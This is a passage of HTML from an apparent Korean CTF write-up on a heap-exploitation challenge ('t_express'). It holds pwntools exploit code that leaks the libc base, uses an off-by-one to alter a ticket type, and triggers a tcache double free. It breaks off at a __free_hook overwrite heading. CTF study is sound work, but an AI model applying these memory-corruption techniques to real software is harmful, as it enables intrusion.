1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>인터페이스</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./t_express'</span><span class=\"token punctuation\">)</span>\nl <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./t_express'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p = remote('ctf.campus.theori.io', 7079)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">Buy</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> first<span class=\"token punctuation\">,</span> last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"(1/2): \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"First name: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Last name: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">View</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index of ticket: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># leak (lib_base)</span>\n    <span class=\"token keyword\">if</span> idx <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"|name |\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        lib_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n                       <span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x83</span> <span class=\"token operator\">-</span> l<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"lib_base : \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lib_base<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> lib_base\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">Use</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index of ticket: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"(1/2/3/4): \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">_free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"라이브러리-주소-노출\" style=\"position:relative;\"><a href=\"#%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\" aria-label=\"라이브러리 주소 노출 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>라이브러리 주소 노출</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">View</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index of ticket: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># leak (lib_base)</span>\n    <span class=\"token keyword\">if</span> idx <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"|name |\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        lib_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n                       <span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x83</span> <span class=\"token operator\">-</span> l<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"lib_base : \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lib_base<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> lib_base\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 480px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABS0lEQVQoz43N2U7CQBiGYa6DSNdpp4MtHSgzlE6XaaerLAohoAd6K7KIy7kXbCCaeCQmb778J0/+lmp40HYYFySILAd33YEGkaybMvgjKAOgwWFLNYaW48aiLppZWwYdzZSBdSkkA1OD9ISh3aNB4kdcBpZiIMVA/8WS1nc8KprbMCtdMnaJr8Nr6cL/H2x7JQ15Wk4HlNl9QoLExkPLwarZvYzd0YxGWTG5Y2k+CnnAc8ISzw8xCVwyBsiRdPhbKt/HGSMsMGW8nJAg1qHdxWQwCinjfpwRlkg67GhQOicDJOnWlWp2NNhWdNWkrXG2yifTh8enxXrTzOez5ZIXeZznk8ViubmPOGecZ1WVVXU9m9p93HVd1Oth4gE0bEX8WDWv9c2HKF6K+sjFLkqes+KQiv1p81Nc7KvmPROHROzK+i1Ot6v155htvwBFVWpjXeXBvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./20.png\"\n        title=\"./20.png\"\n        src=\"/static/7b89a7207699e7bce8d6152aea4f00ca/e85cb/20.png\"\n        srcset=\"/static/7b89a7207699e7bce8d6152aea4f00ca/e9ff0/20.png 180w,\n/static/7b89a7207699e7bce8d6152aea4f00ca/f21e7/20.png 360w,\n/static/7b89a7207699e7bce8d6152aea4f00ca/e85cb/20.png 480w\"\n        sizes=\"(max-width: 480px) 100vw, 480px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>라이브러리 주소</p>\n<h2 id=\"off-by-one을-바탕으로-ticket_type-0으로-변경\" style=\"position:relative;\"><a href=\"#off-by-one%EC%9D%84-%EB%B0%94%ED%83%95%EC%9C%BC%EB%A1%9C-ticket_type-0%EC%9C%BC%EB%A1%9C-%EB%B3%80%EA%B2%BD\" aria-label=\"off by one을 바탕으로 ticket_type 0으로 변경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>off-by-one을 바탕으로 ticket_type 0으로 변경</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Buy<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBBBBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLElEQVQY033Ly26CQABAUf6j5T0wQCMwwzCiQ6K0VktKtFgVRMrTR+P/f0BT00VXJndxN4ebh5MhDn22wJRZNhIUWwKu6w8t2xdURwQuwthBWNSQAtEAU1lHkoYsB5uDiHufx68vcxbNCGPsOYI2elAAGY1t7AmqLgBITOPJgLwKJQApYwq0HmXNIZ6NIw7gtYSTwSip8/rcfl+PV0pGKAjX2WGdlbM4EVSDVw0R/MYr8DYmr2iyPuRkuuO9lUHevrKyr0+X5hLQMWGTouqyryZJNxL4k/8yBVVT4A2LJNVpnOZF0R7L/uzSgIbTqj+X7Snd5Xcx2YjeSieLj222r9pD0yEakPGkqLu8apef27vY34reUvfjdLcv6q5sT8gf0XB6aI5F3a822R38A0l/WddTYKzmAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./21.png\"\n        title=\"./21.png\"\n        src=\"/static/b50f827c72eb8ca9ebc4b0652af36b87/37523/21.png\"\n        srcset=\"/static/b50f827c72eb8ca9ebc4b0652af36b87/e9ff0/21.png 180w,\n/static/b50f827c72eb8ca9ebc4b0652af36b87/f21e7/21.png 360w,\n/static/b50f827c72eb8ca9ebc4b0652af36b87/37523/21.png 720w,\n/static/b50f827c72eb8ca9ebc4b0652af36b87/42d54/21.png 858w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>첫 번째 할당 페이지</p>\n<h2 id=\"첫-번째-해제후-키값-확인\" style=\"position:relative;\"><a href=\"#%EC%B2%AB-%EB%B2%88%EC%A7%B8-%ED%95%B4%EC%A0%9C%ED%9B%84-%ED%82%A4%EA%B0%92-%ED%99%95%EC%9D%B8\" aria-label=\"첫 번째 해제후 키값 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>첫 번째 해제후 키값 확인</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">_free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACfklEQVQoz22S62oTURSFD/qr+AYmcz8nc+bMJclcMpnMpJk0SVNr76011tBSLYrgDx/HJ1BQ8HmKv515iswsSUHF0gUfbNiw2HuxyNHeLvLNbcTpDEGcoB36aKgWJN1GMkzh+T00NQHJcJEFHrod727WTQ9xlkFlHmTDRRDHcDpTkPn8CM92DzEYTRANMmT5FkTbh6QzhIMMXtiDalpQWhzCiUCt9t1OoSaCfgqtZaGpMXTCCE53C0R0DmrW3a2dZLc+fLGoz19f1aeLZe10wjoMBvXB3kl9uH9WT8bbtWxYtUStSqF8JRt8JemtlUz5SqHWStLpSm8lK6L0FmhGp9C6U5y8XGB5/QaXN+8R9vrYG07x6eodPi5vcHO0AKMmJKMFxTAhG+bdlbLxBwrd7IO0glelEZ6XPNgv94+W5cn5dXl28a7shKMySGblyeJteby4KSc7p6XKuqXKvJ8qc2//x7tVqLg1+OYtmU9GxXTcL+bHO8VwZ1oko7Roh1ERp1ERZ2Ex2OwVoh390phf6Gb8y3IvPAAkTj4/SbPvG//4tpENf2yQ5nYGSZhoDH00xgHU9hDy3SvsHhQKtWGYqcXtY7LWIPv6j/QLSbPvhEjzUSXbdtUcRVVzEleKl1cKFevg72HWKnNXlI9tg28SZk0fC++S/MVdErfzgRD5eQ7JEWhsRXg670Fp55ANDkk3IenrPnI0NV6vg1eZW1E+FpSPiWEOHpGH1Ah7kFsCStcHDfrQvC3odhfMsWG5BkybwfVZrbF195yKWbmgPCe6mTxsGEQhXNdHHo6wE02RTGcQ/RxOMoPdG4KJNrjr1FrLgcb8iomZYNaMUD560PA3HeMo7Cap4ggAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./22.png\"\n        title=\"./22.png\"\n        src=\"/static/d9b9cb609acae75f9490eda51c2f305e/37523/22.png\"\n        srcset=\"/static/d9b9cb609acae75f9490eda51c2f305e/e9ff0/22.png 180w,\n/static/d9b9cb609acae75f9490eda51c2f305e/f21e7/22.png 360w,\n/static/d9b9cb609acae75f9490eda51c2f305e/37523/22.png 720w,\n/static/d9b9cb609acae75f9490eda51c2f305e/42d54/22.png 858w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해제 후 키 값 확인 페이지</p>\n<h2 id=\"키-변조후-doube-free-버그-발생\" style=\"position:relative;\"><a href=\"#%ED%82%A4-%EB%B3%80%EC%A1%B0%ED%9B%84-doube-free-%EB%B2%84%EA%B7%B8-%EB%B0%9C%EC%83%9D\" aria-label=\"키 변조후 doube free 버그 발생 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>키 변조후 Doube Free 버그 발생</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Use<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4klEQVQI103Ga0+CUBgAYH5HU27vkXM4cAIkOCgosnU1LYIALyA6a6tVXxzr97c+tLU9Hx7h5jK/vX6MkvmQx5PkzrC5MmDUGTlBLGlMxueI+phF8sAUwWDDkFq8rxqIWnxcCtR90tyFOV6kxWp7eKnq1g1Cy/aqfF1kq2yZY2r1gMiISIiIgKXf6CIAkFgQ/aLnPahOMk/Tqmk2+3Y0jWI36I7vX7vjaXPwmH2mKBIgEeAP6qsSkEjQgg/EX3W/XmZv611X778ns5Jd3FdtVzantPw0rCvAU0Tif2aAQ918/gFLpjZ3KED1vQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./23.png\"\n        title=\"./23.png\"\n        src=\"/static/4b2302c2c455d5c10c5ce9bc9fe4af96/37523/23.png\"\n        srcset=\"/static/4b2302c2c455d5c10c5ce9bc9fe4af96/e9ff0/23.png 180w,\n/static/4b2302c2c455d5c10c5ce9bc9fe4af96/f21e7/23.png 360w,\n/static/4b2302c2c455d5c10c5ce9bc9fe4af96/37523/23.png 720w,\n/static/4b2302c2c455d5c10c5ce9bc9fe4af96/f0685/23.png 835w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>키 값 변조</p>\n<ul>\n<li>키 변조 및 메모리 해제를 두 번 진행한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA8klEQVQY03XL226CMAAAUP7DhUpbKUQzJ5ZCFXEXzFAIYR03JxcRZMv+/wP24N6WJef1SP7Lo2PZ3t4L4l1QhMzPiSUwjebM85ab3WLNdcp0aumUa8Zs4Y7XIeQHhe/J/VqCD0JZCkzDJC766tqdWs5sk7IyOxV5GQaxjLURUu+QOkKqDCdAQTcyUiVopjJLsXEoRNE1Xd8M283zyt4O7Wdf91X6oZIZQGSMtRsw0X9hTYI0AaaAhv8aiaxqjueOOe7c5Fl5zuo2eEsUdQoQAVj7S4JmDqwc0jB6z+vLtR2+V+6TYTnVZWj6r/RYQjKV/8k/N8FDn/TTHEsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./24.png\"\n        title=\"./24.png\"\n        src=\"/static/2cabb6f36d70a3b73419a11b9c6fd818/37523/24.png\"\n        srcset=\"/static/2cabb6f36d70a3b73419a11b9c6fd818/e9ff0/24.png 180w,\n/static/2cabb6f36d70a3b73419a11b9c6fd818/f21e7/24.png 360w,\n/static/2cabb6f36d70a3b73419a11b9c6fd818/37523/24.png 720w,\n/static/2cabb6f36d70a3b73419a11b9c6fd818/79e48/24.png 865w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Double Free Bug</p>\n<ul>\n<li>tcache_entry에 총 3개의 tcache가 생긴 것을 확인할 수 있으며</li>\n<li>Forward Point가 자기 자신을 가리키는 상태 즉, Double Free가 발생하였다.</li>\n</ul>\n<h2 id=\"__free_hook-overwrite\" style=\"position:relative;\"><a href=\"#__free_hook-overwrite\" 